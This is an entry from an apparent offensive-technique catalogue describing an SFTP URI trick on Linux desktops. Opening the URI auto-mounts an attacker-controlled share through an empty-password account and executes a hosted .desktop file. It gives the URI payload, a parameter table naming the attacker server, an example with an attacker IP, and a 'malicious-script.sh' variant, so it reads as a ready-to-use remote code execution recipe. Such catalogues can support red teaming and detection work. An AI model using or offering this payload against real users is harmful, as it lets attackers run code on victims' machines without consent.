---
id: cmd-2
data: 'sftp://nextclouduser@<server>/example.desktop'
tags:
  - rce
  - sftp
  - auto-mount
type: command
output: >-
  Mounts share, prompts for SSH host key (if first time), executes command in
  .desktop file
executor: uri
platforms:
  - Linux
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.883Z'
verified: false
validated: true
submitted: true
---
# sftp-uri-linux-desktop-execution

## Command

URI scheme for Linux SFTP handling.

```uri
sftp://nextclouduser@<server>/example.desktop
```

## Description

SFTP URI that auto-mounts a remote share using an empty-password user account on the server, then opens and executes a .desktop file hosted there.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| nextclouduser | Username with empty password on server | Yes |
| <server> | Attacker-controlled server IP/domain | Yes |
| example.desktop | Path to executable .desktop file | Yes |

## Examples

### Basic Usage

Replace <server> with attacker IP: sftp://nextclouduser@192.168.1.100/example.desktop

### Advanced Usage

Use for any executable file: sftp://user@server/malicious-script.sh (if handler supports)

## Expected Output

File manager (e.g., Thunar on Xubuntu) mounts the share, displays the file, and runs its Exec command upon opening.

## Related

- [[Related Procedure: Exploit-OS-Handler-for-Arbitrary-Code-Execution]]
